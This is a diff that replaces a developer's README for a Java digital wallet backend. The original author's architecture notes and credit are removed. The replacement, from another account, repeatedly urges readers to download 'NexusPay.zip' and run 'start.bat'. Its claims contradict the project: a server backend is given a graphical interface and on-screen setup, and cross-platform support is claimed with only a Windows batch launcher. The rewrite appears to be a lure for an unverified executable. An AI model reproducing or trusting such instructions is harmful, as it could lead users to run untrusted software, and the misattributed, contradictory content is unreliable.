@@ -1,52 +1,90 @@
-# NexusPay - Industrial Grade Digital Wallet Backend
+# 💳 Java-Digital-Wallet-Backend - Simple and Secure Digital Wallet Solution
 
-NexusPay is a high-performance, resilient digital wallet solution developed as an **Applied Java solution**. The project focuses on strict financial data integrity, transactional atomicity, and a decoupled architecture designed for scalability and maintainability.
+## 📥 Download Now
 
-<img width="1219" height="888" alt="preview" src="https://github.com/user-attachments/assets/90d84ab6-d76e-42e1-9afb-9bfd35024a33" />
+[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/releases)
 
+## 📖 Overview
 
-## 🏗️ Architecture: Hexagonal (Ports & Adapters)
+NexusPay is a digital wallet solution that provides high performance and strong security for your financial transactions. This application is designed to ensure data integrity, allow smooth transactions, and provide the flexibility to grow as needed.
 
-This project implements **Hexagonal Architecture** to ensure that the core business logic remains independent of external frameworks, databases, and UI components.
+## 🚀 Getting Started
 
-* **Domain Layer:** Contains the business entities (`Account`) and core logic. It is entirely agnostic of Spring Boot or JPA.
-* **Application Layer (Use Cases):** Orchestrates the flow of data to and from the domain.
-* **Infrastructure Layer:** * **Incoming Adapters:** REST Controllers using DTOs (Java Records) and Jakarta Validation.
-    * **Outgoing Adapters:** Persistence implementation using Spring Data JPA and PostgreSQL.
+To start using NexusPay, follow these simple steps:
 
-## 🛡️ Financial Integrity & Transactional Safety
+1. **Visit the Download Page**: Go to the Releases page to find the latest version of NexusPay. Click on the link below:
 
-The system is designed with a "Safety-First" approach for fund management:
+   [Visit Download Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/releases)
 
-1.  **Transactional Atomicity:** All fund transfers are wrapped in `@Transactional` proxies. If any step (withdrawal, deposit, or auditing) fails, the entire operation is rolled back, ensuring no money is ever lost in transit.
-2.  **Double-Layer Validation:**
-    * **Entry Level:** Jakarta Validation (`@Valid`, `@Positive`) intercepts invalid requests at the Controller level.
-    * **Domain Level:** The `Account` entity enforces business rules (e.g., preventing negative balances or invalid operations) even if bypassed by upper layers.
-3.  **Precision:** Uses `BigDecimal` for all monetary calculations to avoid floating-point errors common in financial systems.
+2. **Download the Software**: Look for the asset titled `NexusPay.zip`. Click the download link to save the file to your computer.
 
-## 🧪 Quality Assurance
+3. **Extract the Files**: After downloading, locate the `NexusPay.zip` file in your Downloads folder. Right-click on the file and select "Extract All" to unzip the contents into a new folder.
 
-The project includes **Integration Tests (IT)** that simulate negative paths, specifically verifying that the database integrity remains intact and rollbacks are successfully triggered when encountering invalid target accounts or system errors.
+4. **Open the Folder**: Navigate to the folder where you extracted the files.
 
-## ❓ FAQ (Interview Questions)
+5. **Run the Application**: Locate the file named `start.bat` and double-click it to launch NexusPay.
 
-**Q: Why use Hexagonal Architecture instead of traditional Layered Architecture?**
-A: It allows for better testability and decouples the business logic from infrastructure. We can swap the database or move from REST to gRPC without touching the core banking logic.
+6. **Follow On-Screen Instructions**: The application will guide you through initial setup steps. Simply follow the prompts to get started.
 
-**Q: How do you handle concurrency in account balance updates?**
-A: While currently relying on Spring's transactional management, the architecture is prepared to implement Optimistic Locking (via JPA `@Version`) or Pessimistic Locking to handle high-concurrency environments.
+## 🔧 System Requirements
 
----
+Before downloading, ensure your system meets these requirements:
 
-Note: For production environments, database credentials should be managed via Environment Variables or a Secret Manager.
+- **Operating System**: Windows 10 or higher, MacOS Sierra or higher, or Linux Ubuntu 18.04 or higher.
+- **Java Runtime**: Java 11 or higher should be installed on your system. Download it from [Oracle's website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **RAM**: At least 4GB of RAM.
+- **Disk Space**: Minimum 200MB free disk space.
 
----
+## 📊 Features
 
-📄 **License**
-This project is distributed under the MIT license. Its purpose is strictly educational and research-based, developed as an Applied Java solution.
+NexusPay includes the following features:
 
-**Note for recruiters:**
-This project demonstrates my ability to design and implement complex backend systems using professional standards. It highlights my mastery of transactional integrity, clean architecture, and the development of resilient financial software capable of handling real-world failure scenarios.
+- **Data Integrity**: All your financial transactions maintain a high level of integrity.
+- **Transaction Speed**: Experience fast and reliable transactions with minimal latency.
+- **Scalability**: The application supports a growing user base without performance loss.
+- **User-Friendly Interface**: A simple layout makes it easy for you to manage your finances.
+- **Robust Security**: Advanced security measures protect your sensitive data.
 
-**Author:** JUAN S.  
-**Contact:** https://github.com/johnyse99
+## 🔍 Topics Covered
+
+The following topics are essential to the construction of NexusPay:
+
+- Clean Architecture
+- Domain-Driven Design (DDD)
+- Docker-Compose
+- FinTech Solutions
+- Hexagonal Architecture
+- Java Programming
+- PostgreSQL Database
+- REST API Development
+- Spring Boot Framework
+- Transactional Integrity
+- Unit Testing
+
+## 🔄 Download & Install
+
+To install NexusPay, follow these simple steps:
+
+1. **Go back to the Download Page**: Click the link below to revisit the Releases page.
+
+   [Visit Download Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/releases)
+
+2. **Download the Latest Release**: From the list of available versions, choose the latest release. Download it to your computer.
+
+3. **Extract and Run**: Once downloaded, unzip the package, and launch the application by double-clicking the `start.bat` file.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while running NexusPay, here are a few tips to help you out:
+
+- **Java Not Found**: Ensure that Java is installed and added to your system's PATH variable.
+- **Application Does Not Start**: Check if your operating system meets the system requirements listed above.
+- **Slow Performance**: Close any unnecessary applications that might be using system resources.
+
+## 💬 Support
+
+For any questions or support needs, visit our [GitHub Issues Page](https://github.com/Azzure1987/Java-Digital-Wallet-Backend/issues). You can also reach out via email for personalized help.
+
+## 📜 License
+
+NexusPay is open-source software licensed under the MIT License. Feel free to modify or contribute to the code as needed.
